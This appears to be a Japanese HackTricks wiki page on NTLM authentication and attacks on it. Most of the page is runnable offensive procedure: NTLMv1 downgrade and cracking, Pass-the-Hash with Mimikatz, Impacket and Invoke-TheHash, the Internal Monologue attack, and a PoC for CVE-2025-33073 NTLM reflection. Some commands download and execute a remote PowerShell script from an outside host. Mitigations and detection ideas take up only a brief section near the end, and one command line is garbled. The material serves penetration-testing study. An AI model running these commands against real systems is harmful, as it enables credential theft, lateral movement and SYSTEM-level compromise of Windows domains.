# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

**Windows XP および Server 2003** が稼働している環境では、LM (Lan Manager) ハッシュが使用されますが、簡単に侵害されることが広く知られています。特定のLMハッシュ `AAD3B435B51404EEAAD3B435B51404EE` は、LMが使用されていないことを示し、空文字列のハッシュを表します。

デフォルトでは、**Kerberos** 認証プロトコルが主な認証方式として使用されます。特定の状況ではNTLM (NT LAN Manager) が使用されます。たとえば、Active Directoryが存在しない場合、ドメインが存在しない場合、設定不備によりKerberosが正常に機能しない場合、または有効なホスト名ではなくIPアドレスを使用して接続する場合です。

ネットワークパケットに **"NTLMSSP"** ヘッダーが存在する場合、NTLM認証プロセスが行われていることを示します。

認証プロトコルであるLM、NTLMv1、NTLMv2のサポートは、`%windir%\Windows\System32\msv1\_0.dll` にある特定のDLLによって提供されます。

**重要なポイント**:

- LMハッシュには脆弱性があり、空のLMハッシュ (`AAD3B435B51404EEAAD3B435B51404EE`) はLMが使用されていないことを示します。
- Kerberosがデフォルトの認証方式であり、NTLMは特定の条件下でのみ使用されます。
- NTLM認証パケットは、"NTLMSSP" ヘッダーで識別できます。
- LM、NTLMv1、NTLMv2プロトコルは、システムファイル `msv1\_0.dll` によってサポートされます。

## LM、NTLMv1、NTLMv2

使用するプロトコルの確認と設定ができます。

### GUI

_secpol.msc_ を実行 -> ローカルポリシー -> セキュリティオプション -> ネットワーク セキュリティ: LAN Manager 認証レベル。レベルは0から5までの6段階です。

![LM、NTLMv1、NTLMv2 - GUI: secpol.mscを実行 - ローカルポリシー - セキュリティオプション - ネットワーク セキュリティ: LAN Manager 認証レベル。レベルは0から5までの6段階です](<../../images/image (919).png>)

### Registry

これにより、レベル5が設定されます。

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

可能な値：

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## 基本的なNTLMドメイン認証スキーム

1. **ユーザー**が**資格情報**を入力します
2. クライアントマシンが**ドメイン名**と**ユーザー名**を含む**認証要求を送信**します
3. **サーバー**が**challenge**を送信します
4. **クライアントは**パスワードのhashを鍵として**challengeを暗号化**し、responseとして送信します
5. **サーバーは**、**ドメイン名、ユーザー名、challenge、response**を**ドメインコントローラー**に送信します。Active Directoryが構成されて**いない**場合、またはドメイン名がサーバー名と同じ場合、資格情報は**ローカルで確認されます**。
6. **ドメインコントローラーはすべてが正しいか確認**し、その情報をサーバーに送信します

**サーバー**と**ドメインコントローラー**は、Netlogonサーバー経由で**Secure Channel**を確立できます。ドメインコントローラーはサーバーのパスワードを把握しているためです（パスワードは**NTDS.DIT** db内にあります）。

### ローカルNTLM認証スキーム

認証の流れは**前述と同じですが**、**サーバー**は認証を試みるユーザーのhashを**SAM**ファイル内に保持しています。そのため、ドメインコントローラーに問い合わせる代わりに、**サーバー自身が**ユーザーを認証できるか確認します。

### NTLMv1 Challenge

**challengeの長さは8 bytes**、**responseの長さは24 bytes**です。

**NT hash（16bytes）**は、それぞれ7bytesの**3つの部分**（7B + 7B + （2B+0x00\*5））に分割されます。**最後の部分はゼロで埋められます**。次に、**challenge**を各部分で個別に**暗号化**し、暗号化された**結果**を連結します。合計：8B + 8B + 8B = 24Bytes。

**問題点**：

- **ランダム性**が不足している
- 3つの部分を個別に**攻撃**してNT hashを見つけられる
- **DESはcrack可能**
- 3番目の鍵は常に**5つのゼロ**で構成される
- **同じchallenge**を与えると、**response**も**同じ**になります。そのため、被害者に "**1122334455667788**" という文字列を**challenge**として与え、**事前計算済みのrainbow table**を使ってresponseを攻撃できます。

### NTLMv1攻撃

Unconstrained delegationは現代の環境ではあまり一般的ではありませんが、到達可能な**Print Spooler service**を悪用すれば、そのようなホストに認証を強制できる可能性があります。

AD上ですでに持っている資格情報やセッションを悪用し、**プリンターに認証を要求させて**、**自分が制御するホスト**に認証させることができます。その後、`metasploit auxiliary/server/capture/smb`または`responder`を使って、**認証challengeを1122334455667788に設定**し、認証の試行をキャプチャします。それが**NTLMv1**を使って行われていれば、**crackできます**。\
`responder`を使う場合は、認証の**downgrade**を試すために、**フラグ`--lm`を使う**ことができます。\
_この手法では、認証にNTLMv1を使用する必要があります（NTLMv2は使えません）。_

プリンターは認証時にコンピューターアカウントを使用すること、またコンピューターアカウントは**長くランダムなパスワード**を使用するため、一般的な**辞書**ではおそらく**crackできない**ことに注意してください。ただし、**NTLMv1**認証では**DES**を使用します（[詳細はこちら](#ntlmv1-challenge)）。そのため、DESのcrackに特化したサービスを使えばcrackできます（例：[https://crack.sh/](https://crack.sh)や[https://ntlmv1.com/](https://ntlmv1.com)）。

### hashcatを使ったNTLMv1攻撃

NTLMv1は[NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi)でも攻撃できます。このツールは、キャプチャしたNTLMv1メッセージをHashcatで使える形式に変換します。<sup>[[1]](#references)</sup>

コマンド

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

以下のように出力されます：

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

次の内容でファイルを作成します:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

hashcatを実行してください（hashtopolisなどのツールを使った分散処理が最適です）。そうしないと数日かかります。

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

この場合、これのパスワードが password だと分かっているので、デモ用に少し手順を省略します。

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

次に、hashcat-utilitiesを使用して、クラック済みのDESキーをNTLM hashの一部に変換します。

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

最後に、最後の部分：

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

組み合わせる:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**チャレンジの長さは8バイト**で、**2つのレスポンスが送信されます**。1つは**24バイト**で、**もう1つ**の長さは可変です。

**最初のレスポンス**は、**クライアント名とドメイン名**を連結した**文字列**を、**NT hash**の**MD4ハッシュ**を**キー**として**HMAC_MD5**で暗号化して作成します。次に、その**結果**を**キー**として、**チャレンジ**を**HMAC_MD5**で暗号化します。これに、8バイトの**クライアントチャレンジ**を追加します。合計24バイトです。

**2つ目のレスポンス**は、**複数の値**（新しいクライアントチャレンジや、**リプレイ攻撃**を防ぐための**タイムスタンプ**など）を使用して作成されます。

**認証に成功した通信を含むPCAP**がある場合は、ドメイン、ユーザー名、サーバーチャレンジ、NTLMv2レスポンスを抽出し、Hashcat用の形式にして、モード`5600`でパスワードの復元を試みます。アーカイブされた実践的な手順ではパケットフィールドの抽出方法を確認でき、Hashcatのサンプルでは現在受け付けられる形式を確認できます。<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**被害者のhashを入手したら**、それを使って被害者に**なりすます**ことができます。\
その**hashを使ってNTLM認証を実行する****ツール**を使用するか、新しい**sessionlogon**を作成して、その**hashをLSASS**に**注入**します。そうすれば、NTLM認証が実行されるたびに、その**hashが使用されます**。後者はmimikatzが行う方法です。

**コンピューターアカウントを使ってもPass-the-Hash攻撃を実行できることを忘れないでください。**

### **Mimikatz**

**管理者として実行する必要があります**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

これは現在のローカルユーザーとしてプロセスを起動し、LSASSは指定された認証情報をアウトバウンドネットワークログオンに関連付けます。これにより、平文パスワードを知らなくても、`runas /netonly`と同様に指定したユーザーとしてネットワークリソースにアクセスできます。

### LinuxからのPass-the-Hash

LinuxからPass-the-Hashを使って、Windowsマシン上でコードを実行できます。\
[**Pass-the-Hashによる実行の実例はこちら。**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### ImpacketのWindowsコンパイル済みツール

[ImpacketのWindows用バイナリはこちらからダウンロードできます](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe**（この場合はコマンドを指定する必要があります。対話型シェルを取得するコマンドとして、cmd.exeとpowershell.exeは使用できません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Impacketのバイナリはほかにもいくつかあります...

### Invoke-TheHash

PowerShellスクリプトはこちらから入手できます：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

この関数は、前述のモードを組み合わせます。**複数のホスト**を指定し、選択したターゲットを除外して、_SMBExec、WMIExec、SMBClient、_ または _SMBEnum_ を選択できます。_**Command**_ パラメーターを指定せずに **SMBExec** または **WMIExec** を選択した場合は、十分な権限があるかどうかのみを確認します。

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールは mimikatz と同じ処理を行います（LSASS メモリを変更します）。

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### ユーザー名とパスワードを使った手動のWindowsリモート実行


{{#ref}}
../lateral-movement/
{{#endref}}

## Windowsホストからの認証情報の抽出

詳しくは、[**Windows認証情報の窃取**](../stealing-credentials/README.md)を参照してください。

## Internal Monologue attack

Internal Monologue Attackは、**LSASSプロセスと直接やり取りせずに**、被害者のマシンからNTLMハッシュを取得できる、ステルス性の高い認証情報抽出手法です。メモリからハッシュを直接読み取り、エンドポイントセキュリティソリューションやCredential Guardによって頻繁にブロックされるMimikatzとは異なり、この攻撃では、**Security Support Provider Interface (SSPI)を介したNTLM認証パッケージ (MSV1_0) へのローカル呼び出し**を利用します。攻撃者はまず、NetNTLMv1が許可されるように、NTLMの設定 (例: LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic) を**ダウングレード**します。次に、実行中のプロセスから取得した既存のユーザートークンを偽装し、NTLM認証をローカルで実行して、既知のチャレンジを使ったNetNTLMv1応答を生成します。<sup>[[4]](#references)</sup>

これらのNetNTLMv1応答を取得すると、攻撃者は**事前計算済みのレインボーテーブル**を使って元のNTLMハッシュを素早く復元し、さらなるPass-the-Hash攻撃によるラテラルムーブメントを実行できます。重要なのは、Internal Monologue Attackはネットワークトラフィックを生成せず、コードをインジェクトせず、メモリのダンプも直接行わないため、ステルス性が保たれることです。そのため、Mimikatzのような従来の手法に比べて、ディフェンダーによる検知が困難です。

セキュリティポリシーが強制されているなどの理由でNetNTLMv1が受け入れられない場合、攻撃者はNetNTLMv1応答を取得できない可能性があります。

このケースに対応するため、Internal Monologueツールは更新されました。`AcceptSecurityContext()`を使ってサーバートークンを動的に取得し、NetNTLMv1が失敗した場合でも**NetNTLMv2応答を取得**できるようになっています。NetNTLMv2のクラックははるかに困難ですが、限られたケースでは、リレー攻撃やオフラインのブルートフォース攻撃につながる可能性があります。

PoCは**[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**にあります。<sup>[[4]](#references)</sup>

## NTLM RelayとResponder

**これらの攻撃の実行方法について、詳しいガイドはこちらを参照してください:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## ネットワークキャプチャからのNTLMチャレンジの解析

[**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)を使用できます。

## シリアライズされたSPNを介したNTLMとKerberosの*Reflection* (CVE-2025-33073)

Windowsには、ホストから発生したNTLM (またはKerberos) 認証を**同じ**ホストに中継してSYSTEM権限を得る*Reflection*攻撃を防ぐための緩和策が複数あります。  

MicrosoftはMS08-068 (SMB→SMB)、MS09-013 (HTTP→SMB)、MS15-076 (DCOM→DCOM) およびその後のパッチで、公開されていた攻撃チェーンのほとんどを防ぎました。しかし、**CVE-2025-33073**は、*マーシャリングされた* (シリアライズされた) target-infoを含むService Principal Name (SPN) を**SMBクライアントが切り詰める**仕組みを悪用すれば、保護を回避できることを示しています。<sup>[[5]](#references)[[6]](#references)</sup>

### バグの概要
1. 攻撃者は、ラベルにマーシャリングされたSPNをエンコードした**DNS Aレコード**を登録します。例:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 被害者は、そのホスト名に対して認証するよう強制されます (PetitPotam、DFSCoerceなど)。
3. SMBクライアントがターゲット文字列 `cifs/srv11UWhRCAAAAA…` を `lsasrv!LsapCheckMarshalledTargetInfo` に渡す際、`CredUnmarshalTargetInfo` の呼び出しによってシリアライズされたblobが**取り除かれ**、**`cifs/srv1`**が残ります。
4. これにより、短縮されたホスト部分がコンピューター名 (`SRV1`) と一致するため、`msv1_0!SspIsTargetLocalhost` (またはKerberosの同等機能) はターゲットを*localhost*と見なします。
5. その結果、サーバーは `NTLMSSP_NEGOTIATE_LOCAL_CALL` を設定し、**LSASSのSYSTEMアクセス・トークン**をコンテキストに注入します (Kerberosの場合は、SYSTEMマーク付きのサブセッションキーが作成されます)。
6. `ntlmrelayx.py` **または** `krbrelayx.py` を使ってその認証をリレーすると、同じホスト上で完全なSYSTEM権限を取得できます。<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Patch & Mitigations
* **CVE-2025-33073** の KB patch は、`mrxsmb.sys::SmbCeCreateSrvCall` にチェックを追加し、ターゲットに marshalled info が含まれる（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）SMB 接続をブロックします。<sup>[[5]](#references)[[6]](#references)</sup>
* SMB relay の宛先では **SMB signing** を強制します。それ以外の宛先では、そのプロトコル固有の signing または Extended Protection の要件と patch level を評価してください。SMB signing だけでは、HTTPS WinRM relay が可能かどうかは判断できません。
* `*<base64>...*` のような DNS レコードを監視し、coercion vectors（PetitPotam、DFSCoerce、AuthIP...）をブロックします。

### Detection ideas
* クライアント IP ≠ サーバー IP である `NTLMSSP_NEGOTIATE_LOCAL_CALL` を含むネットワークキャプチャ。
* subsession key を含み、クライアント principal がホスト名と一致する Kerberos AP-REQ。
* Windows Event 4624/4648 の SYSTEM ログオン直後に、同じホストからのリモート SMB 書き込みが発生していること。<sup>[[5]](#references)</sup>

シリアライズされた target-information DNS 名は、強制された認証を攻撃者に向け、AD CS web-enrollment endpoint への **cross-protocol relay** を実現することもできます。これは同一ホストへの reflection とは別の結果です。[ESC8 の enrollment 条件](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)、DNS write 権限、coercion path、ターゲットの patch level を個別に評価する必要があります。

**SMB arbitrary ports** と **TCP connection reuse** を悪用して `NT AUTHORITY\SYSTEM` に到達する、**March 2026** の local reflection variant については、以下を参照してください。

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat のサンプルハッシュ – NetNTLMv2（mode 5600）](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS に触れずに NTLM Hashes を取得する](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!：詳細な CVE-2025 の分析](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 Hash の Cracking – 801Labs（Internet Archive）](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
